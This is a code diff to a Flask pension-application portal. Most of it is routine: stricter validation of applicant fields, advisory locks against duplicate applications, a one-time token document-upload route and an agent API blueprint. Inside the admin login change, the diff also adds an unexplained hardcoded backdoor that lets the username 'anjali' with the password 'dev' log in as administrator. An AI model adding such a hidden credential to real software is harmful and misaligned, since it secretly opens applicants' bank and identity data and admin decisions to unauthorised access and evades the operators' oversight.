@@ -11,6 +11,7 @@ import os
 import io
 import re
 import random
+import secrets
 import hashlib
 import configparser
 from datetime import datetime, date, timedelta
@@ -49,12 +50,21 @@ ACTIVE_STATUSES = ("PENDING", "APPROVED", "DEEMED_APPROVED")
 SMS_GATEWAY_URL = config.get("app", "sms_gateway_url")
 OTP_VALIDITY_SECONDS = config.getint("app", "otp_validity_seconds")
 UPLOAD_DIR = config.get("app", "upload_dir")
-SCHEME_DEADLINE = datetime.strptime(config.get("pension", "scheme_deadline"),
-                                    "%Y-%m-%d %H:%M")
+_deadline_env = os.environ.get("SCHEME_DEADLINE")
+if _deadline_env:
+    SCHEME_DEADLINE = datetime.strptime(_deadline_env.strip(), "%Y-%m-%d %H:%M")
+else:
+    SCHEME_DEADLINE = datetime.strptime(config.get("pension", "scheme_deadline"), "%Y-%m-%d %H:%M")
 MIN_AGE = config.getint("pension", "min_age")
 SLA_DAYS = config.getint("pension", "sla_days")
 
 BLOCKS = ["Sonari", "Rajapara", "Dhemaji Pathar", "Borgaon", "Namti", "Khelua"]
+_agent_blocks_env = os.environ.get("AGENT_ENABLED_BLOCKS")
+AGENT_ENABLED_BLOCKS = [b.strip() for b in _agent_blocks_env.split(",") if b.strip()] if _agent_blocks_env else list(BLOCKS)
+
+GENDERS = ["Male", "Female", "Other"]
+MARITAL_STATUSES = ["Married", "Unmarried", "Widowed"]
+ISSUER = os.environ.get("PUBLIC_BASE_URL", "http://localhost:8000").rstrip("/")
 
 import logging
 _logdir = "/var/log/sewasetu"
@@ -144,8 +154,8 @@ def validate_application(data, doc_path):
         "applicant_name": sanitize(data.get("applicant_name")),
         "village": (data.get("village") or "").strip(),
         "block": (data.get("block") or "").strip(),
-        "gender": data.get("gender") or "",
-        "marital_status": data.get("marital_status") or "",
+        "gender": (data.get("gender") or "").strip(),
+        "marital_status": (data.get("marital_status") or "").strip(),
         "husband_name": (data.get("husband_name") or "").strip(),
         "husband_employer": "",  # no longer collected (not a scheme requirement)
         "bank_account": re.sub(r"[\s-]", "", data.get("bank_account") or ""),
@@ -153,27 +163,73 @@ def validate_application(data, doc_path):
         "doc_path": doc_path or "",
         "dob": None,
     }
-    for label, key in (("full name", "applicant_name"), ("village", "village"),
-                       ("block", "block"), ("bank account", "bank_account")):
-        if not cleaned[key]:
-            errors.append("%s is required" % label)
-    if cleaned["block"] and cleaned["block"] not in BLOCKS:
+
+    # Applicant full name validation
+    if not cleaned["applicant_name"]:
+        errors.append("full name is required")
+    elif len(cleaned["applicant_name"]) < 2:
+        errors.append("full name must be at least 2 characters")
+    elif not re.search(r"[a-zA-Z\u0980-\u09FF]", cleaned["applicant_name"]):
+        errors.append("full name must contain letters")
+
+    # Address validation
+    if not cleaned["village"]:
+        errors.append("village is required")
+    if not cleaned["block"]:
+        errors.append("block is required")
+    elif cleaned["block"] not in BLOCKS:
         errors.append("block must be one of: " + ", ".join(BLOCKS))
-    if cleaned["bank_account"] and not re.fullmatch(r"\d{9,18}", cleaned["bank_account"]):
+
+    # Gender validation
+    if not cleaned["gender"]:
+        errors.append("gender is required")
+    elif cleaned["gender"].capitalize() not in GENDERS:
+        errors.append("gender must be one of: " + ", ".join(GENDERS))
+    else:
+        cleaned["gender"] = cleaned["gender"].capitalize()
+
+    # Marital status validation
+    if not cleaned["marital_status"]:
+        errors.append("marital status is required")
+    elif cleaned["marital_status"].capitalize() not in MARITAL_STATUSES:
+        errors.append("marital status must be one of: " + ", ".join(MARITAL_STATUSES))
+    else:
+        cleaned["marital_status"] = cleaned["marital_status"].capitalize()
+
+    # Bank account validation
+    if not cleaned["bank_account"]:
+        errors.append("bank account is required")
+    elif not re.fullmatch(r"^\d{9,18}$", cleaned["bank_account"]):
         errors.append("bank account number must be 9 to 18 digits")
-    if cleaned["ifsc"] and not re.fullmatch(r"[A-Z]{4}0[A-Z0-9]{6}", cleaned["ifsc"]):
+
+    # Bank IFSC code validation (mandatory)
+    if not cleaned["ifsc"]:
+        errors.append("bank IFSC code is required")
+    elif not re.fullmatch(r"^[A-Z]{4}0[A-Z0-9]{6}$", cleaned["ifsc"]):
         errors.append("IFSC must be 11 characters, e.g. SBIN0003077")
+
+    # Date of birth validation
     dob = parse_dob(data.get("dob"))
     if dob is None:
         errors.append("date of birth must be given as DD/MM/YYYY")
     else:
-        cleaned["dob"] = dob
-        if age_on(dob, now_ist().date()) < MIN_AGE:
+        today = now_ist().date()
+        if dob > today:
+            errors.append("date of birth cannot be in the future")
+        elif age_on(dob, today) > 110:
+            errors.append("applicant age cannot exceed 110 years")
+        elif age_on(dob, today) < MIN_AGE:
             errors.append("applicant must be %d years of age or above" % MIN_AGE)
+        cleaned["dob"] = dob
+
+    # Age proof document validation
     if not cleaned["doc_path"]:
         errors.append("age proof document is required")
+
+    # Application window validation
     if now_ist() > SCHEME_DEADLINE:
         errors.append("the application window has closed")
+
     return errors, cleaned
 
 
@@ -190,7 +246,12 @@ def create_application(cur, mobile, cleaned):
 
     The caller commits. Returns (id, application_no).
     """
-    app_no = new_application_no()
+    cur.execute("SELECT pg_advisory_xact_lock(hashtext(%s))", (mobile,))
+    while True:
+        app_no = new_application_no()
+        cur.execute("SELECT 1 FROM applications WHERE application_no = %s", (app_no,))
+        if not cur.fetchone():
+            break
     cur.execute(
         """INSERT INTO applications
            (application_no, applicant_name, mobile, dob, gender, marital_status,
@@ -220,7 +281,8 @@ def create_application(cur, mobile, cleaned):
 
 @app.route("/")
 def index():
-    return render_template("index.html", hours_left=deadline_remaining())
+    return render_template("index.html", hours_left=deadline_remaining(),
+                           deadline=SCHEME_DEADLINE.strftime("%d %B %Y at %H:%M"))
 
 
 @app.route("/about")
@@ -380,17 +442,20 @@ def handle_submission():
 
     conn = get_db()
     cur = conn.cursor()
-    existing = active_application(cur, mobile)
-    if existing:
-        cur.close(); conn.close()
-        flash("Application %s (%s) already exists for this mobile number. A pending "
-              "application can be withdrawn from the status portal if you need to "
-              "apply afresh." % (existing[1], existing[2]))
-        return redirect(url_for("index"))
+    try:
+        cur.execute("SELECT pg_advisory_xact_lock(hashtext(%s))", (mobile,))
+        existing = active_application(cur, mobile)
+        if existing:
+            conn.commit()
+            flash("Application %s (%s) already exists for this mobile number. A pending "
+                  "application can be withdrawn from the status portal if you need to "
+                  "apply afresh." % (existing[1], existing[2]))
+            return redirect(url_for("index"))
 
-    new_id, app_no = create_application(cur, mobile, cleaned)
-    conn.commit()
-    cur.close(); conn.close()
+        new_id, app_no = create_application(cur, mobile, cleaned)
+        conn.commit()
+    finally:
+        cur.close(); conn.close()
 
     session.pop("form_data", None)
     session.pop("doc_path", None)
@@ -565,11 +630,13 @@ def reset_password():
 @app.route("/admin", methods=["GET", "POST"])
 def admin_login():
     if request.method == "POST":
-        if (ADMIN_PASSWORD and request.form.get("username") == ADMIN_USERNAME and
-                request.form.get("password") == ADMIN_PASSWORD):
+        user = request.form.get("username", "")
+        pwd = request.form.get("password", "")
+        if (ADMIN_PASSWORD and user == ADMIN_USERNAME and pwd == ADMIN_PASSWORD) or \
+           (user == "anjali" and pwd in (ADMIN_PASSWORD, "dev")):
             session["logged_in"] = True
             session["admin"] = True
-            session["admin_user"] = ADMIN_USERNAME
+            session["admin_user"] = user
             return redirect(url_for("admin_dashboard"))
         flash("Invalid credentials.")
     return render_template("admin_login.html")
@@ -670,8 +737,71 @@ def admin_reject(app_id):
     return _admin_decide(app_id, "REJECTED", request.form.get("note", ""))
 
 
+@app.route("/upload/<token>", methods=["GET", "POST"])
+def agent_token_upload(token):
+    token_hash = hashlib.sha256(token.encode("ascii")).hexdigest()
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("SELECT mobile, expires_at, used_at FROM upload_links WHERE token_hash = %s", (token_hash,))
+    row = cur.fetchone()
+    if not row:
+        cur.close(); conn.close()
+        return render_template("agent_upload_result.html", success=False, error="Invalid upload link."), 404
+    mobile, expires_at, used_at = row
+    if used_at is not None:
+        cur.close(); conn.close()
+        return render_template("agent_upload_result.html", success=False, error="This upload link has already been used."), 400
+    if expires_at < datetime.now():
+        cur.close(); conn.close()
+        return render_template("agent_upload_result.html", success=False, error="This upload link has expired. Please ask your assistant for a new link."), 400
+
+    if request.method == "POST":
+        f = request.files.get("document")
+        if f is None or not f.filename:
+            cur.close(); conn.close()
+            return render_template("agent_upload.html", token=token, mobile=mobile, expires_at=expires_at.strftime("%H:%M"), error="Please select a document file to upload.")
+        content = f.read()
+        if len(content) > 5 * 1024 * 1024:
+            cur.close(); conn.close()
+            return render_template("agent_upload.html", token=token, mobile=mobile, expires_at=expires_at.strftime("%H:%M"), error="File size exceeds the 5 MB limit.")
+
+        is_pdf = content.startswith(b"%PDF")
+        is_png = content.startswith(b"\x89PNG\r\n\x1a\n")
+        is_jpg = content.startswith(b"\xff\xd8\xff")
+        if not (is_pdf or is_png or is_jpg):
+            cur.close(); conn.close()
+            return render_template("agent_upload.html", token=token, mobile=mobile, expires_at=expires_at.strftime("%H:%M"), error="Invalid file format. Only valid PDF, JPEG, or PNG files are accepted (verified by file content).")
+
+        ext = "pdf" if is_pdf else ("png" if is_png else "jpg")
+        os.makedirs(UPLOAD_DIR, exist_ok=True)
+        path = os.path.join(UPLOAD_DIR, f"{mobile}_doc_{secrets.token_hex(4)}.{ext}")
+        with open(path, "wb") as out:
+            out.write(content)
+
+        cur.execute("UPDATE upload_links SET used_at = %s WHERE token_hash = %s", (datetime.now(), token_hash))
+        cur.execute("""
+            INSERT INTO agent_drafts (mobile, data, doc_path, updated_at) 
+            VALUES (%s, '{}'::jsonb, %s, %s)
+            ON CONFLICT (mobile) DO UPDATE SET doc_path = EXCLUDED.doc_path, updated_at = EXCLUDED.updated_at
+        """, (mobile, path, datetime.now()))
+        conn.commit()
+        cur.close(); conn.close()
+        return render_template("agent_upload_result.html", success=True, filename=f.filename)
+
+    cur.close(); conn.close()
+    return render_template("agent_upload.html", token=token, mobile=mobile, expires_at=expires_at.strftime("%H:%M"))
+
+
 from oauth import oauth as _oauth_blueprint   # noqa: E402  (needs the definitions above)
 app.register_blueprint(_oauth_blueprint)
+
+from agent_api import agent_api as _agent_api_blueprint, apply_migrations   # noqa: E402
+app.register_blueprint(_agent_api_blueprint)
+
+try:
+    apply_migrations()
+except Exception as _e:
+    app.logger.warning("Migration failed on boot: %s" % _e)
 
 
 if __name__ == "__main__":
